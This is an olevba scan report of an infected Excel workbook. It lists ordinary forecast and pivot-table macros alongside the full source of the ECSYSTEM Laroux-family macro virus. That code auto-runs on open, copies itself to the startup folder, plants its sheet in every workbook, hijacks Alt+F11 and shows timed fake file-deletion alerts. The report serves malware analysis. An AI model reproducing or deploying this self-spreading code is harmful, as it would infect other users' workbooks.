olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO module1.bas 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub PivotUpdate()
Dim lastrow As Long

' Macro 3/16/2009 by Rolen
' Update Summary pivot table with the data in the forecast page

    Application.ScreenUpdating = False
    
    Sheets("forecast").Select
    lastrow = ActiveSheet.UsedRange.Rows.Count
    
    'Save lastrow in ref
    Sheets("ref").Visible = True
    Sheets("ref").Select
    Range("P9").Value = lastrow
    
    'Refresh pivot table
    Calculate
    Sheets("Summary").Select
    ActiveSheet.PivotTables("PivotTable1").PivotCache.Refresh

    
    'Update time stamp
    Range("B3").Select
    ActiveCell.FormulaR1C1 = "=TEXT(TODAY(),""DD MMM"")"
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
    :=False, Transpose:=False
    
    
    Sheets("Ref").Visible = False
    Sheets("Summary").Select
    Range("C8").Select
    Calculate
    
    Application.ScreenUpdating = True
End Sub


-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO module2.bas 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ClearInput()
'
' Clearinput Macro
' Macro 3/19/2009 by Rolen
' Ask for confirmation if user is sure to delete input, delete input and refresh pivot table

Dim Answer As String
Dim Question As String

    'Question in MessageBox
    Question = "Are you sure to delete all input in this file?"

    'Display MessageBox
    Answer = MsgBox(Question, vbQuestion + vbYesNo, "Alert")

    If Answer = vbNo Then
        Exit Sub
    Else
        Application.ScreenUpdating = False
        Calculate
        Sheets("forecast").Select
        Application.Goto Reference:="C_data"
        Selection.ClearContents
        Application.Run "Pivotupdate"
        Range("A2").Select
        Application.ScreenUpdating = True
    End If

End Sub

-------------------------------------------------------------------------------
VBA MACRO module3.bas 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/module3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Clear Pivot table cache

Option Explicit

Public strProcedure As String

Function PivotCheck(ws As Worksheet) As Boolean
  
  PivotCheck = False
  
  If ws.PivotTables.Count > 0 Then
    PivotCheck = True
  End If
  
End Function

Sub ClearOldpivotItems()
Dim pt As PivotTable
Dim pf As PivotField
Dim pi As PivotItem
Dim strVersion As String
strVersion = Application.Version
Application.ScreenUpdating = False
On Error GoTo errHandler
Dim ws As Worksheet
Set ws = ActiveSheet

  If PivotCheck(ws) Then
    If Val(strVersion) >= 10 Then
      For Each pt In ActiveSheet.PivotTables
        pt.ManualUpdate = True
        pt.PivotCache.MissingItemsLimit = 0
        pt.ManualUpdate = False
      Next pt
    Else
      On Error Resume Next
        For Each pt In ActiveSheet.PivotTables
          pt.RefreshTable
          pt.ManualUpdate = True
          For Each pf In pt.VisibleFields
            If pf.Name <> "Data" Then
              For Each pi In pf.PivotItems
                If pi.RecordCount = 0 And _
                  Not pi.IsCalculated Then
                  pi.Delete
                End If
              Next pi
            End If
          Next pf
          pt.ManualUpdate = False
          pt.RefreshTable
        Next pt
    End If

  Else
    MsgBox "There are no pivot tables on the active sheet"
  End If

Application.ScreenUpdating = True

exitHandler:
  Set pi = Nothing
  Set pf = Nothing
  Set pt = Nothing
  Set ws = Nothing
  Application.ScreenUpdating = True
  Exit Sub

errHandler:
  GoTo exitHandler
End Sub





-------------------------------------------------------------------------------
VBA MACRO module4.bas 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/module4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub ConfirmGetForecast()

' Macro 3/19/2009 by Rolen
' Ask for confirmation before overwriting data

Dim Answer As String
Dim Question As String

    'Question in MessageBox
    Question = "Consolidate data from LBU files and overwrite existing data in this file?" _
    & vbCrLf & "Click 'Yes' to proceed."

    'Display MessageBox
    Answer = MsgBox(Question, vbQuestion + vbYesNo, "Alert")

    If Answer = vbNo Then
        Exit Sub
    Else
            Application.ScreenUpdating = False
            Application.Run "getforcast"
            Application.ScreenUpdating = True
    End If

End Sub

Sub getforcast()

Dim Workpath As String
Dim workfile As String
Dim clist As Byte
Dim childfile As String
Dim childname As String
Dim commentrow As Integer

' Unhide Ref, define workpath and workfile
    Sheets("Ref").Visible = True
    Calculate
    Workpath = ActiveWorkbook.Path
    Sheets("ref").Select
    Range("R3").Select
    Selection.Value = Workpath
    
    workfile = ActiveWorkbook.Name
    Sheets("ref").Select
    Range("R5").Select
    Selection.Value = workfile

' Clear input
    Windows(workfile).Activate
    Sheets("forecast").Select
    Application.Goto Reference:="C_data"
    Selection.ClearContents
    Calculate
    
' Clear comments from old child file
    Sheets("Comments").Select
    Range("C13:C51").Select
    Selection.ClearContents

' Start consolidating list
    Sheets("ref").Select
    clist = 12
    
    For clist = 12 To 24
        If Range("R" & clist) = "" Then Exit For
    childfile = Range("S" & clist).Value
    childname = Range("R" & clist).Value
    commentrow = Range("T" & clist).Value
    
' Import
    Workbooks.Open Filename:=Workpath & "/LBU/" & childfile
    Sheets("forecast").Select
    Calculate
    Application.Goto Reference:="C_data2"
    Selection.Copy
    Windows(workfile).Activate
    Application.Goto Reference:="C_blankrow2"
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Application.CutCopyMode = False
    Calculate
' Fill office if blank
    Sheets("Ref").Select
    If Range("P3").Value <> Range("P7").Value Then
    Sheets("forecast").Select
    Application.Goto Reference:="C_blankoffice"
    Selection.Value = childname
    End If
    
' copy remark
    Windows(childfile).Activate
    Sheets("Comments").Select
    Range("C5:C8").Select
    Selection.Copy
    Windows(workfile).Activate
    Sheets("Comments").Select
    Range("C" & commentrow).Select
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("C5").Select
    Calculate
    
'Close childfile and return mainfile ref
    Windows(childfile).Activate
    ActiveWindow.Close
    Windows(workfile).Activate
    Sheets("ref").Select
    Range("S9").Select
    Selection.Value = childfile
    Range("R9").Select
    Selection.Value = childname
    Next
        
    Sheets("Ref").Visible = False
    Sheets("forecast").Select
    Application.Run "PivotUpdate"

    Calculate

    
End Sub


-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module5.bas 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Updatevoy()

Dim lastrow As Long
Dim checkrow As Long
Dim vcheck As Long
Dim service As String
Dim dgroup As Long
Dim fblankrow As Long
Dim Answer As String
Dim Question As String
Dim Workpath As String
Dim workfile As String

    'Message box confirming user before proceed action
    Question = "Update forecast entries by removing last week voyages & add new voyages?." _
    & vbCrLf & vbCrLf & "Click 'Yes' to get voyages from Voyage.xls & update entries." _
    & vbCrLf & "Click 'No' to update entries with current voylist." _
    & vbCrLf & "Click 'Cancel' if you do not want to update forecast voyages."
    
    'Display MessageBox
    Answer = MsgBox(Question, vbExclamation + vbYesNoCancel, "Alert")

    If Answer = vbCancel Then
        Exit Sub
    End If
    If Answer = vbYes Then
    
    Application.ScreenUpdating = False
    Sheets("Ref").Visible = True
    Sheets("Voylist").Visible = True
    Calculate
        
    Workpath = ActiveWorkbook.Path
    Sheets("ref").Select
    Range("R3").Select
    Selection.Value = Workpath
    
    workfile = ActiveWorkbook.Name
    Range("R5").Select
    Selection.Value = workfile
    
    Workbooks.Open Filename:=Workpath & "/" & "voyage.xls"
    Range("A:C").Copy
    Windows(workfile).Activate
    Sheets("voylist").Select
    Range("A:C").Select
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
    :=False, Transpose:=False
    Application.CutCopyMode = False
    Range("A2").Select
    Windows("voyage.xls").Activate
    ActiveWindow.Close
        '"Please ensure the updated Voyage.xls is save in the same folder as this document"
    End If
    
Application.ScreenUpdating = False
Sheets("Voylist").Visible = True
Sheets("Ref").Visible = True

'Delete voyage
    
    Sheets("forecast").Select
    
    ' Define last row, Loop until last row
    lastrow = ActiveSheet.UsedRange.Rows.Count
        
        For checkrow = lastrow To 3 Step -1

        vcheck = WorksheetFunction.CountIf(Worksheets("voylist").Range("A:A"), Range("B" & checkrow).Value)

        If vcheck = 0 Then
    
        Range("B" & checkrow).Select
                
        ActiveCell.EntireRow.Delete
    
        End If
    
    Next checkrow

  
'Add voyage
'This part is working for Add voyages currently not in forecast page
    

 
    ' Define last row, Loop until last row
    Sheets("Voylist").Select
    lastrow = ActiveSheet.UsedRange.Rows.Count
    For checkrow = 2 To lastrow

                    
    ' find voyage in forecast, no action if voyage exist
    vcheck = WorksheetFunction.CountIf(Worksheets("forecast").Range("B:B"), Range("A" & checkrow).Value)
                    
    If vcheck = 0 Then
                    
    ' Start working for voyage not found in forecast
    service = Left(Range("B" & checkrow).Value, 4)
    
    ' depends on each service, dgroup determine how many rows are add for destination group
    Select Case service
        Case "ASAF"
        dgroup = 1
        
        Case "ASPA"
        dgroup = 2
    
        Case "ASIA"
        dgroup = 3
                         
        Case "ASIP", "AAUS", "ANZL", "AUSE"
        dgroup = 4
                
        Case Else
        dgroup = 1
    End Select
                            
    Calculate
    
    'Locate blankrow in forecast page (by refering to Teu filling or not)
    fblankrow = WorksheetFunction.CountA(Worksheets("forecast").Range("G:G")) + 2
    
    'Copy Voyage/Week/Sling to forecast
    Sheets("Voylist").Select
    Range("A" & checkrow & ":" & "C" & checkrow).Copy
    Sheets("forecast").Select
    Range("B" & fblankrow & ":" & "D" & fblankrow - 1 + dgroup).Select
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
    :=False, Transpose:=False
    Application.CutCopyMode = False
    
    'Fill in Destin Gp
    Range("E" & fblankrow & ":" & "E" & fblankrow - 1 + dgroup) = Range("S_" & service).Value

    'Fill in zero in Teu and Tons
    Range("G" & fblankrow & ":" & "H" & fblankrow - 1 + dgroup) = 0
                     
    Sheets("voylist").Select
    Calculate
                    
  End If
 Next checkrow
    
    Range("A2").Select
    Sheets("Ref").Visible = False
    Sheets("forecast").Select
    Range("G3").Select
    
    
    Application.ScreenUpdating = True

End Sub
-------------------------------------------------------------------------------
VBA MACRO ECSYSTEM.bas 
in file: Virus.MSExcel.Laroux.je-08193da0b82997c129272b5922fc7217f38d5e259f6a3f8fffdde13c0df0ad91 - OLE stream: '_VBA_PROJECT_CUR/VBA/ECSYSTEM'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()

If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "ECSYSTEM.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("ECSYSTEM").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "ECSYSTEM.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("ECSYSTEM.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "ECSYSTEM.xls!cop"
Application.OnKey "%{F11}", "ECSYSTEM.xls!escape"
If ThisWorkbook.Path = Application.StartupPath Then Application.OnTime TimeValue("16:44:44"), "del"
End Sub
Sub del()
On Error Resume Next
If (Now() - Int(Now())) < TimeValue("16:44:00") Or (Now() - Int(Now())) > TimeValue("16:45:00") Then Exit Sub
Application.FileSearch.LookIn = "C:\Documents and Settings\"
Application.FileSearch.Filename = "*.*"
Application.FileSearch.SearchSubFolders = True
Application.FileSearch.Execute
For x = 1 To 5
i = Int(Rnd * Application.FileSearch.FoundFiles.Count) + 1
Beep
MsgBox Application.FileSearch.FoundFiles(i) & Chr(10) & Chr(10) & "ÆÄÀÏÀÌ »èÁ¦µÇ¾ú½À´Ï´Ù.", Title:="ECSYSTEM"
Next
MsgBox "»½! ÀÓ", Title:="ECSYSTEM"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "ECSYSTEM" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("ECSYSTEM.xls").Sheets("ECSYSTEM").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub escape()
On Error Resume Next
Application.OnSheetActivate = "ECSYSTEM.xls!back"
Application.OnKey "%{F11}"
Application.SendKeys "%{F11}"
For Each book In Workbooks
Application.DisplayAlerts = False
If book <> "ECSYSTEM.xls" Then book.Sheets("ECSYSTEM").Delete
Next
For Each book In Workbooks
If book.Name = "ECSYSTEM.xls" Then
book.Close
End If
Next
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F11}", "ECSYSTEM.xls!escape"
Application.OnSheetActivate = "ECSYSTEM.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "ECSYSTEM.xls!cop"
Workbooks.Open Application.StartupPath & "\ECSYSTEM.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  ECSYSTE
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Forecas
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Summar
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Comment
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Voylis
' 0085     11 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  Re
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

